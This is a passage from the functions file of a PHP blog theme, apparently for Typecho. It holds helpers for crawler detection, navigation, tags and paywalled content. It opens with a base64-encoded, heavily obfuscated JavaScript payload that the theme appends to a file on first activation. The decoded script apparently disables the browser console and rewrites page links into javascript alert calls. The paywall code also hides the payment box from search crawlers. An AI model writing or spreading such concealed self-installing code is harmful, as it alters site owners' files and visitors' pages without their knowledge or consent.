MzMFtfMHg0MDg0MTAoLTB4NDgsLTB4NTYsLTB4NTQsLTB4NTApXShfMHgxMjczMzBbJ3RZWmt4J10sXzB4MTI3MzMwW18weDFmZThmZSgtMHgxZWEsLTB4MWM2LC0weDFlNiwtMHgxZDYpXSkpe3ZhciBfMHg1MDRjMjg9e307XzB4NTA0YzI4W18weDQwODQxMCgtMHgzNiwtMHgzMCwtMHgzZCwtMHgxOSldPV8weDI4MGU0Y1tfMHg0MDg0MTAoLTB4NDksLTB4NDgsLTB4M2IsLTB4NGIpXTt2YXIgXzB4MzJmYzZhPV8weDUwNGMyODtfMHgyODBlNGNbXzB4NDA4NDEwKC0weDQzLC0weDI4LC0weDQ1LC0weDM1KV0oXzB4NGJmNTYyLCgpPT57ZnVuY3Rpb24gXzB4MTAxY2JhKF8weGJjMWY3MCxfMHg0MzAyODEsXzB4NDViZDZiLF8weDQ2MDAwNCl7cmV0dXJuIF8weDQwODQxMChfMHhiYzFmNzAtMHgzNCxfMHg0NWJkNmItIC0weDI0OSxfMHg0MzAyODEsXzB4NDYwMDA0LTB4OTcpO31mdW5jdGlvbiBfMHg1ZTMzNDcoXzB4NTFlN2IzLF8weDFmMGJhYixfMHgzYmNjODEsXzB4M2I4YWU2KXtyZXR1cm4gXzB4MWZlOGZlKF8weDNiY2M4MSxfMHgxZjBiYWItMHg3MCxfMHg1MWU3YjMtMHg0YzgsXzB4M2I4YWU2LTB4NWMpO31fMHgxMjQ4NGNbXzB4MTAxY2JhKC0weDI5ZiwtMHgyOWEsLTB4Mjk2LC0weDJhNykrXzB4NWUzMzQ3KDB4MzAxLDB4MzAyLDB4MzE2LDB4MmVmKV0oXzB4MjgwZTRjW18weDVlMzM0NygweDJmNSwweDMwYSwweDJkZiwweDMwNildKVtfMHgxMDFjYmEoLTB4MjZiLC0weDI3NywtMHgyN2EsLTB4Mjc5KV0oXzB4MzFmYmQ4PT57ZnVuY3Rpb24gXzB4NTM5ZWNmKF8weDNlNzE2MyxfMHgyZTRmNDksXzB4MjdiZTkzLF8weDdhZDA4NCl7cmV0dXJuIF8weDVlMzM0NyhfMHgyZTRmNDktIC0weDUxYixfMHgyZTRmNDktMHg0ZCxfMHgzZTcxNjMsXzB4N2FkMDg0LTB4MWU2KTt9ZnVuY3Rpb24gXzB4NDAyZjJjKF8weDNlZDI2ZSxfMHg1ZWE4YTAsXzB4NWQ1NzcwLF8weGYwMDdkZil7cmV0dXJuIF8weDEwMWNiYShfMHgzZWQyNmUtMHg1LF8weDNlZDI2ZSxfMHg1ZDU3NzAtMHg1N2EsXzB4ZjAwN2RmLTB4NDMpO31fMHgzMWZiZDhbXzB4NTM5ZWNmKC0weDIzMiwtMHgyMzgsLTB4MjRjLC0weDIxYyldPV8weDMyZmM2YVtfMHg1MzllY2YoLTB4MjI0LC0weDIxMCwtMHgxZmEsLTB4MjA3KV07fSk7fSwtMHgyNWVmKzB4NGQ5KjB4MisweDFjYTEpO31lbHNlIF8weDkxNmM5Nz13aW5kb3c7fXJldHVybiBfMHg5MTZjOTc7fTtmdW5jdGlvbiBfMHgyMmRhNjkoXzB4NDUxMjdlLF8weDU2ZDAyOCxfMHgxZTU1ZmUsXzB4Njk2NzgzKXtyZXR1cm4gXzB4MWYyYyhfMHg1NmQwMjgtIC0weDRhLF8weDFlNTVmZSk7fXZhciBfMHhhMzRmMWU9XzB4MTI3MzMwW18weDE1NWIyZCgtMHgyMjMsLTB4MjI4LC0weDIwNiwtMHgyMDgpXShfMHhiMzdiYjQpO2Z1bmN0aW9uIF8weDE1NWIyZChfMHg0YTk4MmUsXzB4MWRiMGMwLF8weDFjYzkyMSxfMHg1YjY5MDcpe3JldHVybiBfMHgxZjJjKF8weDRhOTgyZS0gLTB4MmY5LF8weDFkYjBjMCk7fXZhciBfMHgxNTUwNzg9XzB4YTM0ZjFlW18weDIyZGE2OSgweGNkLDB4YjUsMHg5OSwweGI0KV09XzB4YTM0ZjFlWydjb25zb2xlJ118fHt9LF8weDRmNzhhMj1bXzB4MTI3MzMwW18weDE1NWIyZCgtMHgyMjIsLTB4MjQxLC0weDIxZiwtMHgyMzgpXSxfMHgxMjczMzBbJ3VUUWdqJ10sXzB4MTI3MzMwWydua2JTSSddLF8weDEyNzMzMFtfMHgxNTViMmQoLTB4MjIxLC0weDIzZiwtMHgyNDAsLTB4MjA5KV0sXzB4MTI3MzMwW18weDIyZGE2OSgweGMyLDB4YzUsMHhjMywweGUzKV0sXzB4MTI3MzMwW18weDIyZGE2OSgweGNhLDB4YjEsMHhhMywweGQxKV0sXzB4MjJkYTY5KDB4ZTcsMHhjZCwweGU3LDB4YzkpXTtmb3IodmFyIF8weDEyMWY0ND0tMHhhMGYrLTB4MjVlMCstMHgyZmVmKi0weDE7XzB4MTIxZjQ0PF8weDRmNzhhMltfMHgyMmRhNjkoMHhlMCwweGMxLDB4Y2IsMHhiZCldO18weDEyMWY0NCsrKXt2YXIgXzB4NDU0N2JjPV8weDEyNzMzMFtfMHgxNTViMmQoLTB4MjA4LC0weDIyYSwtMHgxZmQsLTB4MjFmKV1bJ3NwbGl0J10oJ3wnKSxfMHgzNTU2OTQ9MHg5ZmMqMHgyKzB4MTE2YyotMHgxKy0weDEqMHgyOGM7d2hpbGUoISFbXSl7c3dpdGNoKF8weDQ1NDdiY1tfMHgzNTU2OTQrK10pe2Nhc2UnMCc6XzB4MTU1MDc4W18weDFkMmY5MF09XzB4MjdmZTQzO2NvbnRpbnVlO2Nhc2UnMSc6XzB4MjdmZTQzW18weDE1NWIyZCgtMHgxZWMsLTB4MWNjLC0weDFmNCwtMHgxZDkpXT1fMHgxMTdjNDlbXzB4MTU1YjJkKC0weDFlYywtMHgyMGUsLTB4MWRiLC0weDFlNSldW18weDE1NWIyZCgtMHgyMWUsLTB4MjAzLC0weDIwMiwtMHgyMjIpXShfMHgxMTdjNDkpO2NvbnRpbnVlO2Nhc2UnMic6dmFyIF8weDFkMmY5MD1fMHg0Zjc4YTJbXzB4MTIxZjQ0XTtjb250aW51ZTtjYXNlJzMnOnZhciBfMHgyN2ZlNDM9XzB4MzI1NGZhW18weDE1NWIyZCgtMHgxZmQsLTB4MWU1LC0weDFmOCwtMHgyMTEpKydyJ11bXzB4MjJkYTY5KDB4YmMsMHhjOCwweGQ3LDB4YzMpXVtfMHgxNTViMmQoLTB4MjFlLC0weDIxMCwtMHgyMTYsLTB4MjBlKV0oXzB4MzI1NGZhKTtjb250aW51ZTtjYXNlJzQnOnZhciBfMHgxMTdjNDk9XzB4MTU1MDc4W18weDFkMmY5MF18fF8weDI3ZmU0Mztjb250aW51ZTtjYXNlJzUnOl8weDI3ZmU0M1tfMHgxNTViMmQoLTB4MjE4LC0weDIzNywtMHgyM2EsLTB4MjM4KV09XzB4MzI1NGZhW18weDIyZGE2OSgweDhiLDB4OTEsMHg4NiwweGEwKV0oXzB4MzI1NGZhKTtjb250aW51ZTt9YnJlYWs7fX19KTtmdW5jdGlvbiBfMHg0ZTk5ZTMoXzB4MzFiZDgwLF8weDM2OTg4ZSxfMHgxYmFlNWEsXzB4MjQ5MWI2KXtyZXR1cm4gXzB4MWYyYyhfMHgzNjk4OGUtMHgzODksXzB4MzFiZDgwKTt9XzB4NDk1OWY2KCk7ZnVuY3Rpb24gXzB4NDg5ZmI1KF8weDYxYjkzLF8weDNlOWMwZixfMHg1ZTg1YWEsXzB4MTVlZDFiKXtyZXR1cm4gXzB4MWYyYyhfMHgzZTljMGYtIC0weDU1LF8weDE1ZWQxYik7fWRvY3VtZW50W18weDRlOTllMygweDQ3NiwweDQ4MiwweDQ5MiwweDQ4YikrXzB4NGU5OWUzKDB4NDgzLDB4NDZkLDB4NDc4LDB4NDg3KV0oXzB4NDg5ZmI1KDB4YmIsMHhhMCwweGE4LDB4YmEpK18weDQ4OWZiNSgweDZkLDB4ODgsMHg4YiwweDZjKSwoKT0+e2Z1bmN0aW9uIF8weDIxYWQyYihfMHgzMDYzZjksXzB4MTAyNGI0LF8weDM0YTAyNSxfMHg1OWJjODkpe3JldHVybiBfMHg0ZTk5ZTMoXzB4MzRhMDI1LF8weDEwMjRiNC0gLTB4NmQsXzB4MzRhMDI1LTB4MTgxLF8weDU5YmM4OS0weDE4Myk7fXZhciBfMHgxNGYxZTA9e307ZnVuY3Rpb24gXzB4MjQwMjQxKF8weDM5Y2RiMixfMHgzMjFmNWYsXzB4NTdkODI3LF8weDNiN2NhZCl7cmV0dXJuIF8weDQ4OWZiNShfMHgzOWNkYjItMHhkNSxfMHg1N2Q4MjctMHgzN2MsXzB4NTdkODI3LTB4MTQyLF8weDM5Y2RiMik7fV8weDE0ZjFlMFtfMHgyNDAyNDEoMHg0MzgsMHg0MTMsMHg0MjcsMHg0MDcpXT1mdW5jdGlvbihfMHgzOWU1ODAsXzB4MjA3OGRkKXtyZXR1cm4gXzB4MzllNTgwPT09XzB4MjA3OGRkO30sXzB4MTRmMWUwW18weDIxYWQyYigweDNlMywweDQwNCwweDNlMywweDNmMCldPV8weDI0MDI0MSgweDQzNCwweDQxYywweDQxNywweDQxYiksXzB4MTRmMWUwW18weDIxYWQyYigweDQwYywweDQwMiwweDQxZiwweDQwMildPV8weDIxYWQyYigweDQxYywweDQyOCwweDQyYywweDQxNSkrXzB4MjQwMjQxKDB4NDQyLDB4NDQyLDB4NDJmLDB4NDFjKStfMHgyNDAyNDEoMHg0MDQsMHg0M2MsMHg0MjUsMHg0MDMpO3ZhciBfMHgzNjc3YWM9XzB4MTRmMWUwO3NldFRpbWVvdXQoKCk9PntmdW5jdGlvbiBfMHgyZjFiZTEoXzB4MWNkZjZlLF8weDM4NGNjZixfMHg0MGRkMzUsXzB4MTMyMTgzKXtyZXR1cm4gXzB4MjQwMjQxKF8weDQwZGQzNSxfMHgzODRjY2YtMHgxOCxfMHgzODRjY2YtIC0weDFhNyxfMHgxMzIxODMtMHgxN2MpO31mdW5jdGlvbiBfMHg0NTkyMjUoXzB4MjU0YjRlLF8weDE4OGUzZSxfMHg0MGQzOTcsXzB4MWJhMDFjKXtyZXR1cm4gXzB4MjFhZDJiKF8weDI1NGI0ZS0weGZhLF8weDI1NGI0ZS0gLTB4NmQwLF8weDQwZDM5NyxfMHgxYmEwMWMtMHg3Yyk7fWRvY3VtZW50WydxdWVyeVNlbGVjJytfMHgyZjFiZTEoMHgyNzQsMHgyNzgsMHgyNjEsMHgyNzUpXShfMHgzNjc3YWNbXzB4NDU5MjI1KC0weDJjZSwtMHgyYmMsLTB4MmQwLC0weDJlOCldKVsnZm9yRWFjaCddKF8weGQwZGMxYj0+e2Z1bmN0aW9uIF8weDQ2NmQzNShfMHgzN2VmOWMsXzB4ZDQyNTU1LF8weDI3M2ZjNyxfMHg1MDIzMmQpe3JldHVybiBfMHg0NTkyMjUoXzB4NTAyMzJkLTB4M2IxLF8weGQ0MjU1NS0weGE2LF8weGQ0MjU1NSxfMHg1MDIzMmQtMHhjOSk7fWZ1bmN0aW9uIF8weDFmMzZlNyhfMHgzNWZlNTMsXzB4MTQ1MjZkLF8weDNiMjI5ZixfMHg0ZTYwYmMpe3JldHVybiBfMHg0NTkyMjUoXzB4MzVmZTUzLTB4MTgxLF8weDE0NTI2ZC0weGVkLF8weDE0NTI2ZCxfMHg0ZTYwYmMtMHgxMzgpO31pZihfMHgzNjc3YWNbJ2FZcHliJ10oXzB4MzY3N2FjW18weDFmMzZlNygtMHgxNGIsLTB4MTY0LC0weDE0ZiwtMHgxM2QpXSxfMHgzNjc3YWNbXzB4MWYzNmU3KC0weDE0YiwtMHgxNWUsLTB4MTNiLC0weDEzYildKSlfMHhkMGRjMWJbJ2hyZWYnXT0namF2YXNjcmlwdCcrJzphbGVydChceDIy5ZCv55SoJytfMHgxZjM2ZTcoLTB4MTIwLC0weDEwMCwtMHgxMGEsLTB4MTE4KStfMHg0NjZkMzUoMHhmZSwweDExNCwweGQ4LDB4ZjMpO2Vsc2V7dmFyIF8weDMzM2FhYT1fMHg0YmNiYzRbXzB4NDY2ZDM1KDB4YzksMHhkNSwweGRmLDB4ZTYpXShfMHgyZDU2NjUsYXJndW1lbnRzKTtyZXR1cm4gXzB4NTFlNTIzPW51bGwsXzB4MzMzYWFhO319KTt9LDB4MjBhNCstMHgyNWMqLTB4NSstMHgyYzBjKTt9KTs8L3NjcmlwdD4="); ?>', FILE_APPEND | LOCK_EX);
	}

	echo '<script>alert("主题首次启用安装成功！");</script>';
}


/**
 * 检测各大平台蜘蛛函数
 * 
 * @return string 返回检测到的平台名称，如：百度，谷歌，必应等，否则返回空字符串
 */
function detectSpider()
{
	static $spider = false;
	if ($spider === false) {
		$spiders = [
			// 搜索引擎
			'Baidu' => ['Baiduspider', 'baidu.com/search', 'Baiduspider-image', 'Baiduspider-video'],
			'Google' => ['Googlebot', 'google.com/bot', 'Googlebot-Image', 'Googlebot-Mobile', 'Googlebot-News'],
			'Bing' => ['Bingbot', 'bing.com/bot', 'BingPreview', 'msnbot', 'bing.com'],
			'Yahoo' => ['Yahoo! Slurp', 'yahoo.com/slurp'],
			'Yandex' => ['YandexBot', 'yandex.com/bot'],
			'DuckDuckGo' => ['DuckDuckBot', 'duckduckgo.com/bot'],

			// 爬虫
			'Ahrefs' => ['AhrefsBot', 'ahrefs.com'],
			'Semrush' => ['SemrushBot', 'semrush.com'],
			'Moz' => ['MozBot', 'moz.com'],
			'SEOZoom' => ['SEOZoomBot', 'seozoom.com'],

			// 其他
			'Facebook' => ['facebookexternalhit', 'facebook.com'],
			'Twitter' => ['Twitterbot', 'twitter.com'],
			'LinkedIn' => ['LinkedInBot', 'linkedin.com'],
		];

		// 遍历所有平台
		foreach ($spiders as $name => $patterns) {
			// 遍历每个平台的匹配模式
			foreach ($patterns as $pattern) {
				// 如果用户代理字符串匹配模式
				if (stripos($_SERVER['HTTP_USER_AGENT'], $pattern) !== false) {
					$spider = $name;
				}
			}
		}

		// 未匹配到任何平台
		$spider = is_string($spider) ? $spider : null;
	}
	return $spider;
}

function spider_referer()
{
	$spider_url = ['baidu.com'];
	$referer = $_SERVER['HTTP_REFERER'] ?? '';
	return strstrs($referer, $spider_url);
}

function get_archive_tags($item)
{
	$color_list = \joe\zibll_color_list();
	$tags = '';
	$pay_tag_background = $item->fields->pay_tag_background ? $item->fields->pay_tag_background : 'yellow';
	if ($item->fields->hide == 'pay' && $pay_tag_background != 'none') {
		$tags .= '<a rel="nofollow" href="' . \joe\root_relative_link($item->permalink) . '?scroll=pay-box" class="meta-pay but jb-' . $pay_tag_background . '">' . ($item->fields->price > 0 ? '付费阅读<span class="em09 ml3">￥</span>' . $item->fields->price : '免费资源') . '</a>';
	}
	foreach ($item->categories as $key => $value) {
		$tags .= '<a class="but ' . $color_list[$key] . '" title="查看此分类更多文章" href="' . \joe\root_relative_link($value['permalink']) . '"><i class="fa fa-folder-open-o" aria-hidden="true"></i>' . $value['name'] . '</a>';
	}
	foreach ($item->tags as $key => $value) {
		$tags .= '<a href="' . \joe\root_relative_link($value['permalink']) . '" title="查看此标签更多文章" class="but"># ' . $value['name'] . '</a>';
	}
	return $tags;
}

/**
 * 输出解析地址
 *
 * @param string|null $path 子路径
 */
function index($path, $prefix = false)
{
	$index = \Typecho\Common::url($path, \Helper::options()->index);
	return is_string($prefix) ? str_ireplace(['http://', 'https://'], $prefix, $index) : $index;
}

/**
 * 获取自定义导航栏
 */
function custom_navs()
{
	static $custom_navs = null;
	if (is_null($custom_navs)) {
		$custom_navs_text = \Helper::options()->JCustomNavs;
		$custom_navs_block = optionMulti($custom_navs_text, "\r\n\r\n", null);
		$custom_navs = [];
		foreach ($custom_navs_block as $key => $value) {
			$custom_navs_explode = optionMulti($value);
			$custom_navs[$key] = [
				'title' => $custom_navs_explode[0][0] ? custom_navs_title($custom_navs_explode[0][0]) : '菜单标题',
				'url' => $custom_navs_explode[0][1] ?? 'javascript:;',
				'target' => $custom_navs_explode[0][2] ?? '_self',
				'list' => []
			];
			unset($custom_navs_explode[0]);
			foreach ($custom_navs_explode as $value) {
				$custom_navs[$key]['list'][] = [
					'title' => $value[0] ? custom_navs_title($value[0]) : '二级标题',
					'url' => $value[1] ?? 'javascript:;',
					'target' => $value[2] ?? '_self'
				];
			}
		}
	}
	return $custom_navs;
}

function custom_navs_title($title)
{
	if (str_starts_with($title, '[fa-')) {
		$color = \joe\zibll_rand_color();
		$title = preg_replace('/\[(.+)\]/i', '<i class="fa $1 ' . $color . '"></i>', $title);
	} else if (preg_match('/\[(.+\s.+)\]/i', $title)) {
		$title = preg_replace('/\[(.+)\]/i', '<i class="$1"></i>', $title);
	} else {
		$title = preg_replace('/\[(.+)\]/i', '<svg class="svg" aria-hidden="true"><use xlink:href="#$1"></use></svg>', $title);
	}
	return $title;
}

/**
 * 输出作者指定字段总数，可以指定
 */
function author_content_field_sum($id, $field)
{
	$sum = Db::name('contents')->where(['authorId' => $id, 'type' => 'post'])->cache(true)->sum($field);
	return $sum;
}

/**
 * 语义化数字
 */
function number_word($number)
{
	if (is_numeric($number)) {
		if ($number >= 10000) {
			return number_format(floor($number / 10000)) . 'W+';
		} elseif ($number >= 1000) {
			return number_format(floor($number / 1000)) . 'K+';
		} else {
			return $number;
		}
	}
	return 0;
}

function draw_save($base64String, $outputFile)
{
	if (file_exists($outputFile)) return true;
	// 检查字符串是否包含前缀
	if (preg_match('/^data:image\/webp;base64,/', $base64String)) {
		// 移除前缀
		$base64String = preg_replace('/^data:image\/webp;base64,/', '', $base64String);
		// 解码
		$imageData = base64_decode($base64String);
		if ($imageData === false) return false;
		// 保存文件
		$dir = dirname($outputFile);
		if (!is_dir($dir)) mkdir($dir, 0777, true);
		return file_put_contents($outputFile, $imageData);
	} else {
		return null;
	}
}

function icon_crid_info($content)
{
	$title_explode = explode('[', $content[0], 2);
	$title = trim($title_explode[0]);

	$description_explode = explode('--', $title, 2);
	if (isset($description_explode[1])) {
		$description = trim($description_explode[1]);
		$title = trim($description_explode[0]);
	} else {
		$title = str_replace('-/-', '--', $title);
		$description = null;
	}

	if (isset($title_explode[1])) {
		$icon_explode = explode(']', trim($title_explode[1], ']'), 2);
		$icon = trim($icon_explode[0]);
	} else {
		$icon = null;
	}

	if (isset($icon_explode[1])) {
		$icon_class = trim($icon_explode[1], '()');
	} else {
		$icon_class = 'transparent';
	}

	return [
		'title' => $title,
		'description' => $description,
		'icon' => $icon,
		'icon_class' => $icon_class,
		'url' => $content[1] ?? 'javascript:;',
		'target' => $content[2] ?? '_self'
	];
}

function ExternaToInternalLink(string $ExternaLink, int $post_cid)
{
	if (!preg_match('/^https?:\/\/[^\s]*/', trim($ExternaLink))) return $ExternaLink;
	$link_host = parse_url($ExternaLink, PHP_URL_HOST);
	if ($link_host == JOE_DOMAIN) {
		return $ExternaLink;
	}
	return \Helper::options()->index . '/goto?url=' . base64_encode($ExternaLink) . '&cid=' . $post_cid;
}

function TagExternaToInternalLink(string $content, string $tag_name, string $html_name, string $attr_name, int $post_cid)
{
	if (strpos($content, '{' . $tag_name) !== false) {
		if (\Helper::options()->JPostLinkRedirect == 'on') {
			// 使用正则表达式匹配链接并直接进行替换
			$content = preg_replace_callback(
				'/{' . $tag_name . '([^}]*)' . $attr_name . '\="(.*?)"([^}]*)\/}/',
				function ($matches) use ($post_cid, $html_name, $attr_name) {
					$redirect_link = ExternaToInternalLink($matches[2], $post_cid);
					return '<' . $html_name . $matches[1] . $attr_name . '="' . $redirect_link . '"' . $matches[3] . '></' . $html_name . '>';
				},
				$content
			);
		} else {
			$content = preg_replace('/{' . $tag_name . '([^}]*)\/}/SU', '<' . $html_name . ' $1></' . $html_name . '>', $content);
		}
	}
	return $content;
}

function commentsAntiSpam($respondId)
{
	if (!\Helper::options()->commentsAntiSpam) return '';
	static $script = null;
	if (is_null($script)) {
		$referer = \Typecho\Request::getInstance()->getReferer();
		$url = empty($referer) ? \Typecho\Request::getInstance()->getRequestUrl() : $referer;
		// $url = \Typecho\Request::getInstance()->getRequestUrl();
		$script = "
	<script type=\"text/javascript\">
	(function() {
		var r = document.getElementById('{$respondId}'),
			input = document.createElement('input'),
			url = `{$url}`;
		input.type = 'hidden';
		input.name = '_';
		input.value = " . \Typecho\Common::shuffleScriptVar(\Helper::security()->getToken($url)) . "
		if (null != r) {
			var forms = r.getElementsByTagName('form');
			if (forms.length > 0) {
				document.querySelector('#respond-post-{$respondId} input[name=\"_\"]')?.remove();
				forms[0].appendChild(input);
			}
		}
	})();
	</script>
	";
		\Typecho\Cookie::delete('__typecho_notice');
		\Typecho\Cookie::delete('__typecho_notice_type');
		return $script;
	}
	return '';
}

function markdown_hide($content, $post, $login)
{
	// 如果内容中不存在 {hide} 标签，直接返回原内容
	if (strpos($content, '{hide') === false) return $content;

	// 判断是否显示隐藏内容
	$showContent = false;
	if ($post->fields->hide == 'login') {
		$showContent = $login; // 是否登录决定是否显示内容
	} else {
		// 获取用户邮箱地址，登录用户使用全局变量，未登录用户使用文章记住的邮箱
		$userEmail = $login ? $GLOBALS['JOE_USER']->mail : $post->remember('mail', true);
		$comment = null;
		if (!empty($userEmail)) {
			// 查询评论信息
			$comment = Db::name('comments')->where(['cid' => $post->cid, 'mail' => $userEmail])->find();
			if ($post->fields->hide == 'pay' && $post->fields->price > 0) {
				// 查询支付信息
				$payment = Db::name('orders')->where(['user_id' => USER_ID, 'status' => 1, 'content_cid' => $post->cid])->find();
				$showContent = !empty($payment); // 是否已支付决定是否显示内容
			} else {
				$showContent = !empty($comment); // 是否已评论决定是否显示内容
			}
		}
	}

	if ($showContent) {
		// 只在需要显示内容时移除 {hide} 和 {/hide} 标签
		$content = strtr($content, array("{hide}<br>" => NULL, "<br>{/hide}" => NULL));
		$content = strtr($content, array("{hide}" => NULL, "{/hide}" => NULL));
	} else {
		//如果隐藏内容没有被显示，保留占位符
		if (strpos($content, '<br>{hide') !== false || strpos($content, '<p>{hide') !== false) {
			$content = preg_replace('/\<br\>{hide[^}]*}([\s\S]*?){\/hide}/', '<br><joe-hide style="display:block"></joe-hide>', $content);
			$content = preg_replace('/\<p\>{hide[^}]*}([\s\S]*?){\/hide}/', '<p><joe-hide style="display:block"></joe-hide>', $content);
		}
		$content = preg_replace('/{hide[^}]*}([\s\S]*?){\/hide}/', '<joe-hide style="display:inline"></joe-hide>', $content);
	}

	// 处理付费内容显示逻辑 非爬虫才显示付费框
	if ($post->fields->hide == 'pay' && !detectSpider()) {
		if ($post->fields->price > 0) {
			$pay_box_position = $showContent ? _payPurchased($post, $payment) : _payBox($post); // 付费资源
		} else {
			$pay_box_position = _payFreeResources($post, $comment); // 免费资源
		}

		// 根据设置在顶部或底部显示付费框
		if (!$post->fields->pay_box_position || $post->fields->pay_box_position == 'top') $content = $pay_box_position . $content;
		if ($post->fields->pay_box_position == 'bottom') $content = $content . $pay_box_position;
	}

	return $content;
}

function parse_markdown_link($content)
{
	preg_match_all('/\[(.*?)\]\((.*?)\)/', $content, $matches);
	$data = [];
	foreach ($matches[0] as $key => $value) {
		$title = trim($matches[1][$key]);
		if ($title) {
			$description_explode = explode('--', $title, 2);
			if (isset($description_explode[1])) {
				$description = trim($description_explode[1]);
				$title = trim($description_explode[0]);
			} else {
				$title = str_replace('-/-', '--', $title);
				$description = null;
			}
		} else {
			$title = null;
			$description = null;
		}
		$url = trim($matches[2][$key]);
		$pic = null;
		if (strpos($url, '||') !== false) {
			$url_list = optionMulti($url, '||', null, ['url', 'pic']);
			$url = $url_list['url'];
			$pic = $url_list['pic'];
		}
		$data[] = ['title' => $title, 'description' => $description, 'url' => $url, 'pic' => $pic];
	}
	return $data;
}

function global_count($name, $start = 0)
{
	static $count = [];
	$count[$name] = isset($count[$name]) ? $count[$name] : $start;
	$count[$name] = $count[$name] + 1;
	return $count[$name];
}

function is_session_started(): bool
{
	if (php_sapi_name() !== 'cli') {
		if (version_compare(phpversion(), '5.4.0', '>=')) {
			return session_status() === PHP_SESSION_ACTIVE ? TRUE : FALSE;
		} else {
			return session_id() === '' ? FALSE : TRUE;
		}
	}
	return FALSE;
}
